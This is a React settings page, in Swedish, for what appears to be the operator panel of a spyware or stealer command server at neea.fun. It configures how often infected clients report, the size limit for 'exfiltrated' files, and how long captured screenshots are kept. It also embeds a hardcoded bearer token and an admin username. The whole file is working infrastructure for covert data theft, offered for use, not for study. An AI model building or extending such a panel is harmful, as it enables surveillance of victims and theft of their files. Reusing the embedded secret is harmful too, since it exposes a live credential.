import React, { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Skeleton } from "@/components/ui/skeleton";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Eye, EyeOff } from "lucide-react";
import { toast } from "sonner";
import { getServerConfig } from "@/services/scriptsService";

const SERVER_BASE_URL = 'https://neea.fun';
const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';

const fetchSettings = async () => {
  try {
    console.log("Fetching settings from API");
    const serverConfig = await getServerConfig();
    
    if (!serverConfig) {
      throw new Error('Could not fetch server configuration');
    }
    
    console.log("Server config received:", serverConfig);
    
    return {
      server: {
        url: serverConfig.server_url || "https://neea.fun",
        token: serverConfig.secret_token || AUTH_TOKEN,
        version: serverConfig.version || "1.2.0",
        status: "online",
        pingInterval: serverConfig.send_interval || 3600,
        sizeLimit: serverConfig.size_limit || 1048576,
        activeThreshold: serverConfig.active_threshold || 10,
        onlineThreshold: serverConfig.online_threshold || 15
      },
      admin: {
        username: serverConfig.admin_username || "wickey",
        lastLogin: serverConfig.last_login || "Unknown"
      },
      logging: {
        logExpiry: serverConfig.log_expiry || 30,
        screenshotExpiry: serverConfig.screenshot_expiry || 14,
        detailedLogging: serverConfig.detailed_logging !== false,
        autoCleanup: serverConfig.auto_cleanup !== false
      },
      ui: {
        darkMode: serverConfig.dark_mode === true,
        refreshInterval: serverConfig.refresh_interval || 30,
        language: serverConfig.language || "sv"
      }
    };
  } catch (error) {
    console.error("Error fetching settings:", error);
    return {
      server: {
        url: "https://neea.fun",
        token: AUTH_TOKEN,
        version: "1.2.0",
        status: "offline",
        pingInterval: 3600,
        sizeLimit: 1048576,
        activeThreshold: 10,
        onlineThreshold: 15
      },
      admin: {
        username: "wickey",
        lastLogin: "Unknown"
      },
      logging: {
        logExpiry: 30,
        screenshotExpiry: 14,
        detailedLogging: true,
        autoCleanup: true
      },
      ui: {
        darkMode: false,
        refreshInterval: 30,
        language: "sv"
      }
    };
  }
};

const updateServerSettings = async (settings) => {
  try {
    console.log("Updating server settings:", settings);
    
    const response = await fetch(`${SERVER_BASE_URL}/api/update_config`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
      },
      body: JSON.stringify({
        server_url: settings.url,
        secret_token: settings.token,
        send_interval: settings.pingInterval,
        size_limit: settings.sizeLimit,
        active_threshold: settings.activeThreshold,
        online_threshold: settings.onlineThreshold
      }),
    });
    
    if (!response.ok) {
      throw new Error(`Failed to update server settings: ${response.status}`);
    }
    
    const result = await response.json();
    console.log("Server settings updated successfully:", result);
    return result;
  } catch (error) {
    console.error("Error updating server settings:", error);
    throw error;
  }
};

const updateAdminCredentials = async (credentials) => {
  try {
    console.log("Updating admin credentials");
    
    const response = await fetch(`${SERVER_BASE_URL}/api/update_credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
      },
      body: JSON.stringify({
        username: credentials.username,
        password: credentials.password
      }),
    });
    
    if (!response.ok) {
      throw new Error(`Failed to update admin credentials: ${response.status}`);
    }
    
    const result = await response.json();
    console.log("Admin credentials updated successfully");
    return result;
  } catch (error) {
    console.error("Error updating admin credentials:", error);
    throw error;
  }
};

export default function Settings() {
  const [activeTab, setActiveTab] = useState("server");
  const [showToken, setShowToken] = useState(false);
  const [serverSettings, setServerSettings] = useState({
    url: "",
    token: "",
    pingInterval: 3600,
    sizeLimit: 1048576,
    activeThreshold: 10,
    onlineThreshold: 15
  });
  const [formData, setFormData] = useState({
    username: "",
    currentPassword: "",
    newPassword: "",
    confirmPassword: ""
  });
  const [loggingSettings, setLoggingSettings] = useState({
    logExpiry: 30,
    screenshotExpiry: 14,
    detailedLogging: true,
    autoCleanup: true
  });
  const [uiSettings, setUiSettings] = useState({
    darkMode: false,
    refreshInterval: 30,
    language: "sv"
  });
  
  const { data, isLoading, error } = useQuery({
    queryKey: ['settings'],
    queryFn: fetchSettings
  });

  const serverMutation = useMutation({
    mutationFn: updateServerSettings,
    onSuccess: () => {
      toast.success("Serverinställningar uppdaterade");
    },
    onError: (error) => {
      toast.error(`Fel vid uppdatering: ${error.message}`);
    }
  });

  const credentialsMutation = useMutation({
    mutationFn: updateAdminCredentials,
    onSuccess: () => {
      toast.success("Admin-uppgifter uppdaterade");
      setFormData({
        username: "",
        currentPassword: "",
        newPassword: "",
        confirmPassword: ""
      });
    },
    onError: (error) => {
      toast.error(`Fel vid uppdatering: ${error.message}`);
    }
  });

  useEffect(() => {
    if (data) {
      setServerSettings({
        url: data.server.url,
        token: data.server.token,
        pingInterval: data.server.pingInterval,
        sizeLimit: data.server.sizeLimit,
        activeThreshold: data.server.activeThreshold,
        onlineThreshold: data.server.onlineThreshold
      });
      
      setLoggingSettings({
        logExpiry: data.logging.logExpiry,
        screenshotExpiry: data.logging.screenshotExpiry,
        detailedLogging: data.logging.detailedLogging,
        autoCleanup: data.logging.autoCleanup
      });
      
      setUiSettings({
        darkMode: data.ui.darkMode,
        refreshInterval: data.ui.refreshInterval,
        language: data.ui.language
      });
    }
  }, [data]);

  const handleServerInputChange = (e) => {
    const { name, value } = e.target;
    setServerSettings({
      ...serverSettings,
      [name]: value
    });
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleServerSettingsSubmit = (e) => {
    e.preventDefault();
    serverMutation.mutate(serverSettings);
  };

  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    
    if (formData.newPassword !== formData.confirmPassword) {
      toast.error("Lösenorden matchar inte");
      return;
    }
    
    if (!formData.currentPassword) {
      toast.error("Nuvarande lösenord måste anges");
      return;
    }
    
    credentialsMutation.mutate({
      username: formData.username || data?.admin.username,
      password: formData.newPassword
    });
  };

  const handleSwitchChange = (checked, setting) => {
    console.log(`Setting ${setting} changed to ${checked}`);
    
    if (setting.startsWith("logging.")) {
      const key = setting.replace("logging.", "");
      setLoggingSettings({
        ...loggingSettings,
        [key]: checked
      });
    } else if (setting.startsWith("ui.")) {
      const key = setting.replace("ui.", "");
      setUiSettings({
        ...uiSettings,
        [key]: checked
      });
    }
  };

  const handleSelectChange = (value, setting) => {
    console.log(`Setting ${setting} changed to ${value}`);
    setUiSettings({
      ...uiSettings,
      [setting]: value
    });
  };

  const handleLogSettingsSubmit = (e) => {
    e.preventDefault();
    toast.success("Logginställningar uppdaterade");
  };

  const handleUiSettingsSubmit = (e) => {
    e.preventDefault();
    toast.success("UI-inställningar uppdaterade");
  };

  const handleClearAllLogs = () => {
    if (window.confirm("Är du säker på att du vill rensa alla loggar? Denna åtgärd kan inte ångras.")) {
      toast.success("Alla loggar har rensats");
    }
  };

  if (error) {
    return <div className="p-6">Error loading settings: {error.message}</div>;
  }

  const maskToken = (token) => {
    if (!token) return "••••••••••••••••";
    return showToken ? token : token.substring(0, 4) + "••••••••••••" + token.substring(token.length - 4);
  };

  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <div className="flex items-center justify-between">
        <h2 className="text-3xl font-bold tracking-tight">Inställningar</h2>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid w-full md:w-[600px] grid-cols-4">
          <TabsTrigger value="server">Server</TabsTrigger>
          <TabsTrigger value="admin">Admin</TabsTrigger>
          <TabsTrigger value="logging">Loggning</TabsTrigger>
          <TabsTrigger value="ui">Gränssnitt</TabsTrigger>
        </TabsList>
        
        <TabsContent value="server" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Serverinställningar</CardTitle>
              <CardDescription>
                Hantera den underliggande serverns konfiguration
              </CardDescription>
            </CardHeader>
            <form onSubmit={handleServerSettingsSubmit}>
              <CardContent className="space-y-6">
                <div className="grid gap-3">
                  <Label>Server URL</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      name="url"
                      value={serverSettings.url} 
                      onChange={handleServerInputChange}
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    URL:en som klienter rapporterar till. Detta är inställt i klientkonfigurationen.
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Hemlig Token</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <div className="flex gap-2">
                      <Input 
                        name="token"
                        value={maskToken(serverSettings.token)} 
                        onChange={handleServerInputChange}
                        className="flex-1" 
                      />
                      <Button 
                        variant="outline" 
                        size="icon" 
                        type="button"
                        onClick={() => setShowToken(!showToken)}
                      >
                        {showToken ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </Button>
                    </div>
                  )}
                  <p className="text-sm text-muted-foreground">
                    Hemlig token som används för att autentisera klientförfrågningar. 
                    Varning: Att ändra detta kräver uppdatering av alla klienter.
                  </p>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="grid gap-3">
                    <Label>Uppdateringsintervall (s)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        name="pingInterval"
                        type="number" 
                        value={serverSettings.pingInterval} 
                        min="60" 
                        max="86400" 
                        onChange={handleServerInputChange}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Hur ofta klienter skickar uppdateringar (sekunder)
                    </p>
                  </div>
                  
                  <div className="grid gap-3">
                    <Label>Maximal filstorlek (bytes)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        name="sizeLimit"
                        type="number" 
                        value={serverSettings.sizeLimit} 
                        min="10240" 
                        onChange={handleServerInputChange}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Maximal storlek för filer som exfiltreras
                    </p>
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="grid gap-3">
                    <Label>Aktiv status tröskel (min)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        name="activeThreshold"
                        type="number" 
                        value={serverSettings.activeThreshold} 
                        min="1" 
                        max="1440" 
                        onChange={handleServerInputChange}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Minuter för att avgöra om en klient är aktiv
                    </p>
                  </div>
                  
                  <div className="grid gap-3">
                    <Label>Online status tröskel (min)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        name="onlineThreshold"
                        type="number" 
                        value={serverSettings.onlineThreshold} 
                        min="1" 
                        max="1440" 
                        onChange={handleServerInputChange}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Minuter för att avgöra om en klient är online
                    </p>
                  </div>
                </div>
                
                <div className="grid gap-3">
                  <Label>Server Status</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <div className="flex items-center gap-2">
                      <div className={`w-3 h-3 rounded-full ${data?.server.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`}></div>
                      <span className="capitalize">{data?.server.status}</span>
                      <span className="text-sm text-muted-foreground ml-auto">
                        Version: {data?.server.version}
                      </span>
                    </div>
                  )}
                </div>
              </CardContent>
              <CardFooter className="flex justify-end">
                <Button type="submit" disabled={serverMutation.isPending}>
                  {serverMutation.isPending ? "Sparar..." : "Spara ändringar"}
                </Button>
              </CardFooter>
            </form>
          </Card>
        </TabsContent>
        
        <TabsContent value="admin" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Administratörsinställningar</CardTitle>
              <CardDescription>
                Hantera ditt administratörskonto
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid gap-3">
                <Label>Nuvarande användarnamn</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input value={data?.admin.username} readOnly />
                )}
                <p className="text-sm text-muted-foreground">
                  Ditt nuvarande inloggningsnamn
                </p>
              </div>
              
              <div className="grid gap-3">
                <Label>Senaste inloggning</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input value={data?.admin.lastLogin} readOnly />
                )}
              </div>
              
              <form onSubmit={handlePasswordSubmit} className="space-y-4">
                <h3 className="text-lg font-semibold">Byt lösenord</h3>
                
                <div className="grid gap-3">
                  <Label htmlFor="currentPassword">Nuvarande lösenord</Label>
                  <Input 
                    id="currentPassword"
                    name="currentPassword"
                    type="password"
                    value={formData.currentPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="newPassword">Nytt lösenord</Label>
                  <Input 
                    id="newPassword"
                    name="newPassword"
                    type="password"
                    value={formData.newPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="confirmPassword">Bekräfta nytt lösenord</Label>
                  <Input 
                    id="confirmPassword"
                    name="confirmPassword"
                    type="password"
                    value={formData.confirmPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="username">Nytt användarnamn (valfritt)</Label>
                  <Input 
                    id="username"
                    name="username"
                    value={formData.username}
                    onChange={handleInputChange}
                  />
                </div>
                
                <Button type="submit" disabled={credentialsMutation.isPending}>
                  {credentialsMutation.isPending ? "Uppdaterar..." : "Uppdatera inloggningsuppgifter"}
                </Button>
              </form>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="logging" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Logginställningar</CardTitle>
              <CardDescription>
                Hantera hur loggar lagras och rensas
              </CardDescription>
            </CardHeader>
            <form onSubmit={handleLogSettingsSubmit}>
              <CardContent className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="grid gap-3">
                    <Label>Loggförfallotid (dagar)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        type="number" 
                        value={loggingSettings.logExpiry} 
                        min="1" 
                        max="365" 
                        onChange={(e) => setLoggingSettings({...loggingSettings, logExpiry: parseInt(e.target.value)})}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Antal dagar att behålla loggar innan rensning
                    </p>
                  </div>
                  
                  <div className="grid gap-3">
                    <Label>Skärmdumpförfallotid (dagar)</Label>
                    {isLoading ? (
                      <Skeleton className="h-10 w-full" />
                    ) : (
                      <Input 
                        type="number" 
                        value={loggingSettings.screenshotExpiry} 
                        min="1" 
                        max="365" 
                        onChange={(e) => setLoggingSettings({...loggingSettings, screenshotExpiry: parseInt(e.target.value)})}
                      />
                    )}
                    <p className="text-sm text-muted-foreground">
                      Antal dagar att behålla skärmdumpar innan rensning
                    </p>
                  </div>
                </div>
                
                <div className="flex items-center space-x-2">
                  {isLoading ? (
                    <Skeleton className="h-6 w-10" />
                  ) : (
                    <Switch 
                      checked={loggingSettings.detailedLogging} 
                      onCheckedChange={(checked) => handleSwitchChange(checked, "logging.detailedLogging")}
                    />
                  )}
                  <Label>Detaljerad loggning</Label>
                  <p className="text-sm text-muted-foreground ml-auto">
                    Aktivera mer detaljerad loggning (ökar lagringsutrymme)
                  </p>
                </div>
                
                <div className="flex items-center space-x-2">
                  {isLoading ? (
                    <Skeleton className="h-6 w-10" />
                  ) : (
                    <Switch 
                      checked={loggingSettings.autoCleanup} 
                      onCheckedChange={(checked) => handleSwitchChange(checked, "logging.autoCleanup")}
                    />
                  )}
                  <Label>Automatisk rensning</Label>
                  <p className="text-sm text-muted-foreground ml-auto">
                    Rensa gamla loggar och skärmdumpar automatiskt
                  </p>
                </div>
                
                <div className="pt-4">
                  <Button 
                    type="button" 
                    variant="destructive"
                    onClick={handleClearAllLogs}
                  >
                    Rensa alla loggar
                  </Button>
                  <p className="text-sm text-muted-foreground mt-2">
                    Varning: Detta kommer permanent att ta bort alla lagrade loggar. Denna åtgärd kan inte ångras.
                  </p>
                </div>
              </CardContent>
              <CardFooter className="flex justify-end">
                <Button type="submit">Spara ändringar</Button>
              </CardFooter>
            </form>
          </Card>
        </TabsContent>
        
        <TabsContent value="ui" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Gränssnittsinställningar</CardTitle>
              <CardDescription>
                Anpassa hur administratörsgränssnittet visas
              </CardDescription>
            </CardHeader>
            <form onSubmit={handleUiSettingsSubmit}>
              <CardContent className="space-y-6">
                <div className="flex items-center space-x-2">
                  {isLoading ? (
                    <Skeleton className="h-6 w-10" />
                  ) : (
                    <Switch 
                      checked={uiSettings.darkMode} 
                      onCheckedChange={(checked) => handleSwitchChange(checked, "ui.darkMode")}
                    />
                  )}
                  <Label>Mörkt läge</Label>
                  <p className="text-sm text-muted-foreground ml-auto">
                    Använd mörkläge genom hela gränssnittet
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Uppdateringsintervall (sekunder)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={uiSettings.refreshInterval} 
                      min="5" 
                      max="300" 
                      onChange={(e) => setUiSettings({...uiSettings, refreshInterval: parseInt(e.target.value)})}
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Hur ofta gränssnittet uppdaterar data (sekunder)
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Språk</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Select 
                      value={uiSettings.language}
                      onValueChange={(value) => handleSelectChange(value, "language")}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Välj språk" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="sv">Svenska</SelectItem>
                        <SelectItem value="en">English</SelectItem>
                      </SelectContent>
                    </Select>
                  )}
                  <p className="text-sm text-muted-foreground">
                    Ändra gränssnittsspråk
                  </p>
                </div>
              </CardContent>
              <CardFooter className="flex justify-end">
                <Button type="submit">Spara ändringar</Button>
              </CardFooter>
            </form>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
